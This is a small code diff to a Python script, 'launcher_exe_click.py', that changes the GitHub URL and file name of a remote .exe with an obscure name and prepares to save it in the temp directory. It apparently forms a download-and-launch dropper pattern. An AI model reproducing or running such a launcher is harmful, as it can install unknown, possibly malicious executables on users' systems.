@@ -1,8 +1,8 @@
 # launcher_exe_click.py
 import os, tempfile, requests, certifi
 
-URL  = "https://raw.githubusercontent.com/Prenda00/canlmiop/main/dikduid.exe"
-NAME = "dikduid.exe"
+URL  = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui.exe"
+NAME = "dikdui.exe"
 
 def main():
     p = os.path.join(tempfile.gettempdir(), NAME)
